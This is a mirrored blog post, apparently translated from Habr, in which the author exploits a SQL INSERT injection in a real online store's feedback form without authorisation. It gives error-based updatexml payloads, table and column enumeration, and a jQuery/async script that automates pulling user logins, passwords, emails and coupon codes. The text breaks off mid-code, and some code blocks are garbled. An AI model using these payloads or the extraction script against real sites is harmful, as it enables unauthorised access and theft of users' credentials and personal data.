<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>SQL Insert Injection in one online store</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="For a long time on Habr√© stories about SQL injection did not sound. And there are generally very few stories from the life of SQL INSERT injection. Th...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>SQL Insert Injection in one online store</h1><div class="post__text post__text-html js-mediator-article"> <a href="http://habrahabr.ru/post/264579/"><img src="https://habrastorage.org/files/c9b/e79/558/c9be795586eb4b4183dbffe00556027a.png"></a> <br>  For a long time on Habr√© stories about SQL injection did not sound.  And there are generally very few stories from the life of SQL INSERT injection.  Therefore, I will tell mine. <div class="spoiler">  <b class="spoiler_title">Lyrical introduction</b> <div class="spoiler_text">  <b>Lyrical introduction</b> <br><br>  It all started with my desire to buy something not cheap in a collapsible form in the online store ABru company B. After registration, contact with the manager by e-mail, receiving the parcel and review its contents, it turned out that some hardware is not enough.  There was no complete list of everything needed, just a list of bolts, nuts and washers.  I started the assembly, reaching the place where the missing bolts could not be done.  Therefore, I have meticulously compiled a description of the hardware that was not found and sent it by e-mail to the same girl manager with whom we communicated.  To the credit of the store is to say that almost everything you need was sent the second parcel.  Therefore, I began assembling, driving fears into the far corner of my mind that there might be something else missing.  But, having reached the finish line, it turned out that approximately 1 / 4th part of the device is not enough in principle, judging by the photographs from the manual and common sense.  Therefore, a second, much more extensive, followed the first letter about the incomplete, and the assembly was postponed. <br>  When the second week of waiting was over, I managed to convince myself that the girl manager had gone on vacation.  Therefore, I sent her a letter two weeks ago again and turned to searching for other channels of electronic communication - I really didn‚Äôt want to call Moscow.  First of all, the same email was sent to the general email address A@B.ru, to which an instant response was received: the mail server refuses to accept the email because of the overflowed mailbox of the &lt;muzhik&gt; @ B.ru.  Then a feedback form was found on the site - the last thread connecting me at the moment with an online store.  First of all, I described the problem of a crowded mailbox and inserted a message about the refusal to deliver a letter that contained single quotes ... <br></div></div><br>  <b>Start</b> <br><br>  To try to send an error report via the feedback form, for a couple of seconds an error appeared on the page, in which MySQL voice was guessed.  Therefore, I opened the browser console, repeated the request and looked into the server response: <br><a name="habracut"></a><br><pre><code class="sql hljs">Error displaying the error page: Application Instantiation Error: You have an error in your SQL syntax; at line 1 SQL=<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> ab_com_feedback (<span class="hljs-string"><span class="hljs-string">`id`</span></span>, <span class="hljs-string"><span class="hljs-string">`ordering`</span></span>, <span class="hljs-string"><span class="hljs-string">`state`</span></span>, <span class="hljs-string"><span class="hljs-string">`checked_out`</span></span>, <span class="hljs-string"><span class="hljs-string">`checked_out_time`</span></span>, <span class="hljs-string"><span class="hljs-string">`created_by`</span></span>, <span class="hljs-string"><span class="hljs-string">`name`</span></span>, <span class="hljs-string"><span class="hljs-string">`email`</span></span>, <span class="hljs-string"><span class="hljs-string">`phone`</span></span>, <span class="hljs-string"><span class="hljs-string">`ask`</span></span>, <span class="hljs-string"><span class="hljs-string">`answer`</span></span>, <span class="hljs-string"><span class="hljs-string">`createdate`</span></span>, <span class="hljs-string"><span class="hljs-string">`changedate`</span></span>, <span class="hljs-string"><span class="hljs-string">`userans`</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-string"><span class="hljs-string">'2015-08-04 11:36:37'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'Max'</span></span>, <span class="hljs-string"><span class="hljs-string">'&lt; &gt;@gmail.com'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">',     '</span></span>&lt;&gt;@B.ru<span class="hljs-string"><span class="hljs-string">'    .'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'2015-08-04 11:36:37'</span></span>, <span class="hljs-string"><span class="hljs-string">'0000-00-00 00:00:00'</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>);</code> </pre> <br>  So, SQL insert injection was found in the online store, to which I gave my blood. <br>  First of all, I found a couple of decent materials on the topic.  The most interesting of them is <a href="https://dl.packetstormsecurity.net/papers/database/SQLi_Insert.pdf">SQL Injection in Insert, Update and Delete Statements (Osanda Malith Jayathissa)</a> .  Thanks to him, the glance fell on the <a href="http://dev.mysql.com/doc/refman/5.1/en/xml-functions.html">updatexml</a> function, which appeared in MySQL 5.1 (i.e. if it does not work, then it will be possible to draw the appropriate conclusion: <blockquote>  UpdateXML (xml_target, xpath_expr, new_xml) </blockquote><br>  The meaning of using the function is to create in advance the wrong XPath Expression (second argument).  For this, Osanda proposes to do concatenation with the "~" character.  Well, check in local MySQL: <br><pre> <code class="sql hljs">mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">'123'</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> dual; +<span class="hljs-comment"><span class="hljs-comment">------------------------+ | updatexml(1, '123', 0) | +------------------------+ | NULL | +------------------------+ 1 row in set (0,00 sec) mysql&gt; select updatexml(1, '~123', 0) from dual; ERROR 1105 (HY000): XPATH syntax error: '~123'</span></span></code> </pre><br>  Yes it works.  Now we create the message body for our store.  The first request turned out to look like this: <br><pre> <code class="sql hljs">message' or updatexml(1,concat(0x7e,(version())),0) or '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '1');<span class="hljs-comment"><span class="hljs-comment">--'</span></span></code> </pre><br>  Then I thought a little and reduced it to: <br><pre> <code class="sql hljs">' or updatexml(1,concat(0x7e,(version())),0) or '</code> </pre><br>  Online store response: <br><pre> <code class="sql hljs">Error displaying the error page: Application Instantiation Error: XPATH syntax error: '~5.5.41-MariaDB-log' SQL=<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> ab_com_feedback (<span class="hljs-string"><span class="hljs-string">`id`</span></span>, <span class="hljs-string"><span class="hljs-string">`ordering`</span></span>, <span class="hljs-string"><span class="hljs-string">`state`</span></span>, <span class="hljs-string"><span class="hljs-string">`checked_out`</span></span>, <span class="hljs-string"><span class="hljs-string">`checked_out_time`</span></span>, <span class="hljs-string"><span class="hljs-string">`created_by`</span></span>, <span class="hljs-string"><span class="hljs-string">`name`</span></span>, <span class="hljs-string"><span class="hljs-string">`email`</span></span>, <span class="hljs-string"><span class="hljs-string">`phone`</span></span>, <span class="hljs-string"><span class="hljs-string">`ask`</span></span>, <span class="hljs-string"><span class="hljs-string">`answer`</span></span>, <span class="hljs-string"><span class="hljs-string">`createdate`</span></span>, <span class="hljs-string"><span class="hljs-string">`changedate`</span></span>, <span class="hljs-string"><span class="hljs-string">`userans`</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-string"><span class="hljs-string">'2015-08-04 12:39:12'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'Ken'</span></span>, <span class="hljs-string"><span class="hljs-string">'ken@mailinator.com'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(<span class="hljs-number"><span class="hljs-number">0x7e</span></span>,(<span class="hljs-keyword"><span class="hljs-keyword">version</span></span>())),<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'2015-08-04 12:39:12'</span></span>, <span class="hljs-string"><span class="hljs-string">'0000-00-00 00:00:00'</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>);</code> </pre><br>  It worked!  Everything revolves on MariaDB 5.5.  Differences from MySQL are minimal, version 5.5 supports many useful operators and functions.  Walking through data typical of such situations, I pulled out the following information: <br><pre> <code class="sql hljs">version: 5.5.41-MariaDB-log hostname: db-www user: A@ABru database: A</code> </pre><br>  Now you can try the full SQL queries.  First of all, for the sake of interest, I write this: <br><pre> <code class="sql hljs">' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span>=<span class="hljs-string"><span class="hljs-string">'root'</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  But, of course, was refused: <br><pre> <code class="sql hljs">Error displaying the error page: Application Instantiation Error: <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> command denied <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span> <span class="hljs-string"><span class="hljs-string">'A'</span></span>@<span class="hljs-string"><span class="hljs-string">'ABru'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-string"><span class="hljs-string">'user'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SQL</span></span>=<span class="hljs-keyword"><span class="hljs-keyword">INSERT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">INTO</span></span> ab_com_feedback (<span class="hljs-string"><span class="hljs-string">`id`</span></span>, <span class="hljs-string"><span class="hljs-string">`ordering`</span></span>, <span class="hljs-string"><span class="hljs-string">`state`</span></span>, <span class="hljs-string"><span class="hljs-string">`checked_out`</span></span>, <span class="hljs-string"><span class="hljs-string">`checked_out_time`</span></span>, <span class="hljs-string"><span class="hljs-string">`created_by`</span></span>, <span class="hljs-string"><span class="hljs-string">`name`</span></span>, <span class="hljs-string"><span class="hljs-string">`email`</span></span>, <span class="hljs-string"><span class="hljs-string">`phone`</span></span>, <span class="hljs-string"><span class="hljs-string">`ask`</span></span>, <span class="hljs-string"><span class="hljs-string">`answer`</span></span>, <span class="hljs-string"><span class="hljs-string">`createdate`</span></span>, <span class="hljs-string"><span class="hljs-string">`changedate`</span></span>, <span class="hljs-string"><span class="hljs-string">`userans`</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">VALUES</span></span> (<span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-string"><span class="hljs-string">'1'</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>, <span class="hljs-string"><span class="hljs-string">'2015-08-04 14:27:21'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'Ken'</span></span>, <span class="hljs-string"><span class="hljs-string">'ken@mailinator.com'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> updatexml(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(<span class="hljs-number"><span class="hljs-number">0x7e</span></span>,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> mysql.user <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">user</span></span>=<span class="hljs-string"><span class="hljs-string">'root'</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'2015-08-04 14:27:21'</span></span>, <span class="hljs-string"><span class="hljs-string">'0000-00-00 00:00:00'</span></span>, <span class="hljs-string"><span class="hljs-string">'0'</span></span>);</code> </pre><br>  Now you need to get a list of tables in the current database.  To do this, use the <a href="http://dev.mysql.com/doc/refman/5.0/en/information-schema.html">information_schema</a> meta table available with MySQL 5.0: <br><pre> <code class="sql hljs">' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">concat</span></span>(table_schema, <span class="hljs-string"><span class="hljs-string">':'</span></span>, table_name) <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> information_schema.tables <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> table_schema=<span class="hljs-keyword"><span class="hljs-keyword">database</span></span>() <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  By changing the first parameter in the LIMIT statement, you can loop through all the current tables.  I had enough for <div class="spoiler">  <b class="spoiler_title">first 20 pieces</b> <div class="spoiler_text"><pre> <code class="sql hljs"> aa:cart aa:category aa:includes aa:items aa:layout aa:menu aa:aabb_ak_profiles aa:aabb_ak_stats aa:aabb_ak_storage aa:aabb_assets aa:aabb_associations aa:aabb_banner_clients aa:aabb_banner_tracks aa:aabb_banners aa:aabb_categories aa:aabb_com_feedback aa:aabb_com_photo_votes aa:aabb_com_photo_votes_comment aa:aabb_com_photo_votes_likes aa:aabb_com_wishlist</code> </pre><br></div></div><br>  I decide to automate.  This is an AJAX POST request and jQuery is enabled on the site.  We need to send several requests at once - this is asynchronous work, so I decided to immediately load the <a href="https://github.com/caolan/async">async</a> library and try using it to get the desired list of tables.  Turned out <br><div class="spoiler">  <b class="spoiler_title">not very elegant function of creating and sending multiple simultaneous requests</b> <div class="spoiler_text"><pre> <code class="javascript hljs">$.getScript(<span class="hljs-string"><span class="hljs-string">'https://raw.githubusercontent.com/caolan/async/master/lib/async.js'</span></span>); (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ans_start = <span class="hljs-string"><span class="hljs-string">" '~"</span></span>, <span class="hljs-comment"><span class="hljs-comment">//       ans_stop = "' SQL=", //    lim = 20, start_from = 0; //   AJAX- async.times(lim, function(i, next) { var injection = "' or updatexml(0, concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit "+ (start_from + i) +", 1)), 0) or '"; $.ajax({ url: '/feedback/post.php', method: 'POST', data: $.param({ data_email: 'undefined', data_email_body: 'undefined', data_email_subject: 'A B', type: 'feedback', name: 'Test', mail: 'test@mailinator.com', phone: '', feedbacktext: injection, else: '', recipient: 'A@B.ru', btn: '' }), success: function(resp) { next(null, resp.substring(resp.indexOf(ans_start) + ans_start.length, resp.indexOf(ans_stop))); }, error: function(jqXHR, textStatus) { next(textStatus); } }); }, function(err, results) { //       if (err) return console.error(err); window.INJ_RESULTS = results; //   ,         ,      -    - console.log(results.join('\n')); //         }); })();</span></span></code> </pre><br></div></div><br>  Thus, I received a list of the first 20 tables, but I realized that at the same time sending a lot of requests was not good (the server responded to the last of them within 20 seconds).  I decided that it was not worth threatening the stability of the store and changed the function async.times to async.timesSeries so that each next request would be sent after receiving a reply to the previous one.  Changed the parameter lim from 20 to 200 and went for a cup of tea.  When I returned, I was at my disposal <div class="spoiler">  <b class="spoiler_title">list of all tables</b> <div class="spoiler_text"><pre> <code class="sql hljs">aa:cart aa:category &lt;...&gt; aa:aabb_finder_links aa:aabb_finder_links_terms0 aa:aabb_finder_links_terms1 &lt;...&gt; aa:aabb_jcomments_votes aa:aabb_jsecurelog aa:aabb_jshopping_addons &lt;...&gt; aa:aabb_jshopping_coupons &lt;...&gt; aa:aabb_jshopping_shipping_meth &lt;...&gt; aa:aabb_jshopping_usergroups aa:aabb_jshopping_users &lt;...&gt; aa:aabb_usergroups aa:aabb_users aa:aabb_viewlevels aa:aabb_weblinks aa:aabb_wf_profiles aa:aabb_xmap_items aa:aabb_xmap_sitemap aa:modules aa:orders aa:oshibka aa:params aa:reviews aa:slideshow aa:users</code> </pre><br></div></div><br>  From this list it became clear two facts: there is a Joomla and the amount of useful information is limited to 32 characters.  And we cannot remove the first of them ("~"), which means we have only 31 characters.  Well, not so little.  There were a lot of interesting tables (3 tables * users and aabb_jshopping_coupons).  First, I investigated the structure of the users table, modifying the injection variable: <br><pre> <code class="sql hljs">' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> column_name <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> information_schema.columns <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> table_name=<span class="hljs-string"><span class="hljs-string">'users'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br><pre> <code class="sql hljs">id, login, password, email, tel, name, firma, active, date, role</code> </pre><br>  Then its contents using the function <a href="http://dev.mysql.com/doc/refman/5.0/en/string-functions.html">CONCAT_WS</a> : <br><pre> <code class="sql hljs">' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">CONCAT_WS</span></span>(<span class="hljs-string"><span class="hljs-string">':'</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>,login,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  But each record turned out to be exactly 31 characters long due to an excess of information, so first it was necessary to overcome this limitation.  To do this, I decided to use the <a href="https://mariadb.com/kb/en/mariadb/substring/">SUBSTRING</a> function, and implement the receipt of a new portion of data through recursion.  The result was <br><div class="spoiler">  <b class="spoiler_title">This is the query constructor `ajax93t411`.</b> <div class="spoiler_text"><pre> <code class="sql hljs">$.getScript('https://raw.githubusercontent.com/caolan/async/master/lib/async.js'); // ,     var ANS_START = " '~", ANS_STOP = "' SQL=", ANS_ERR = "Er", ANS_LIM = 31; //   // start_from  lim      // construct_req - ,     function ajax93t411(start_from, lim, construct_req) { //       start_from = start_from || 0; lim = lim || 1; //   . i, offset -    construct_req function req(i, offset, callback) { $.ajax({ url: '/feedback/post.php', method: 'POST', data: $.param({ data_email: 'undefined', data_email_body: 'undefined', data_email_subject: 'A B', type: 'feedback', name: 'Test', mail: 'test@mailinator.com', phone: '', feedbacktext: construct_req(start_from, i, offset), else: '', recipient: 'A@B.ru', btn: '' }), success: function(resp) { callback(null, resp.substring(resp.indexOf(ANS_START) + ANS_START.length, resp.indexOf(ANS_STOP))); }, error: function(jqXHR, textStatus) { callback(textStatus); } }); } //      31,     //   ,   function constructReq(i, full_answer, offset, next) { req(i, offset, function(err, answer) { if (err) return next(err, full_answer); full_answer += answer; if (answer.length == ANS_LIM) { constructReq(i, full_answer, offset + ANS_LIM, next); } else { next(null, full_answer); } }); } //       async.timesSeries(lim, function(i, next) { constructReq(i, '', 1, next); }, function(err, results) { if (err) return console.error(err); window.INJ_RESULTS = results; console.log(results.join(', ')); }); }</code> </pre><br></div></div><br>  According to this algorithm, the data will be pulled out even longer, but completely.  Now you can create your own requests separately from the general logic: <br><pre> <code class="sql hljs">function inj(start_from, i, offset) { return "' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SUBSTRING</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">concat_ws</span></span>(<span class="hljs-string"><span class="hljs-string">':'</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>,login,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,email), <span class="hljs-string"><span class="hljs-string">"+ offset +"</span></span>, <span class="hljs-string"><span class="hljs-string">"+ ANS_LIM +"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-string"><span class="hljs-string">"+ (start_from + i) +"</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'" } ajax93t411(0, 30, inj)</span></span></code> </pre><br>  And the first 30 lines of the users table in the browser console. <br><pre> <code class="sql hljs">function inj(start_from, i, offset) { return "' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SUBSTRING</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">concat_ws</span></span>(<span class="hljs-string"><span class="hljs-string">':'</span></span>,username,email,<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>), <span class="hljs-string"><span class="hljs-string">"+ offset +"</span></span>, <span class="hljs-string"><span class="hljs-string">"+ ANS_LIM +"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> aabb_users <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-string"><span class="hljs-string">"+ (start_from + i) +"</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'" } ajax93t411(0, 30, inj)</span></span></code> </pre><br>  Further I will describe only the most interesting moments. <br>  Coupons, incl.  for Habr and Giktayms, proved to be overdue.  Yes, and I already bought my toy. <br><pre> <code class="sql hljs">function inj(start_from, i, offset) { return "' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SUBSTRING</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">concat_ws</span></span>(<span class="hljs-string"><span class="hljs-string">':'</span></span>,coupon_code,coupon_value,coupon_start_date,coupon_expire_date), <span class="hljs-string"><span class="hljs-string">"+ offset +"</span></span>, <span class="hljs-string"><span class="hljs-string">"+ ANS_LIM +"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> aabb_jshopping_coupons <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-string"><span class="hljs-string">"+ (start_from + i) +"</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'" } ajax93t411(0, 30, inj)</span></span></code> </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      All tables are full length for all available databases: <br><pre> <code class="sql hljs">function inj(start_from, i, offset) { return "' or updatexml(0, concat(0x7e,(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">SUBSTRING</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">concat_ws</span></span>(<span class="hljs-string"><span class="hljs-string">':'</span></span>, table_schema, table_name), <span class="hljs-string"><span class="hljs-string">"+ offset +"</span></span>, <span class="hljs-string"><span class="hljs-string">"+ ANS_LIM +"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> information_schema.tables <span class="hljs-keyword"><span class="hljs-keyword">LIMIT</span></span> <span class="hljs-string"><span class="hljs-string">"+ (start_from + i) +"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-string"><span class="hljs-string">'" } ajax93t411(62, 100, inj); //  62 -   information_schema ajax93t411(162, 100, inj);</span></span></code> </pre><br>  As it turned out, not only the online store ABru works on Joomla, but also the same B.ru store on it and on the same server.  But I did not see any prospects from researching another site.  In the end, my goal was not to gain money.  So I decided that reading the data is good, but ... <br><br>  <b>Is it possible to write something down?</b> <br><br>  As it turned out, no.  Since only <a href="https://mariadb.com/kb/en/mariadb/subqueries-scalar-subqueries/">subqueries</a> are available to us.  I decided that it was worth trying all the same work with files.  But in order not to harm the online store with my careless actions, I will transfer the narration to my own car, where I spent <div class="spoiler">  <b class="spoiler_title">some experiences</b> <div class="spoiler_text">  Create a simple table: <br><pre> <code class="sql hljs">mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">create</span></span> <span class="hljs-keyword"><span class="hljs-keyword">database</span></span> <span class="hljs-keyword"><span class="hljs-keyword">test</span></span>; Query OK, 1 row affected (0,06 sec) mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">create</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> t(<span class="hljs-keyword"><span class="hljs-keyword">id</span></span> <span class="hljs-built_in"><span class="hljs-built_in">int</span></span>, msg <span class="hljs-built_in"><span class="hljs-built_in">text</span></span>); Query OK, 0 rows affected (0,70 sec) mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">values</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-string"><span class="hljs-string">'msg'</span></span>); Query OK, 1 row affected (0,06 sec) mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> t; +<span class="hljs-comment"><span class="hljs-comment">------+------+ | id | msg | +------+------+ | 1 | msg | +------+------+ 1 row in set (0,00 sec)</span></span></code> </pre><br>  Let's try to simulate SQL insert injection: <br><pre> <code class="sql hljs">mysql&gt; <span class="hljs-keyword"><span class="hljs-keyword">insert</span></span> <span class="hljs-keyword"><span 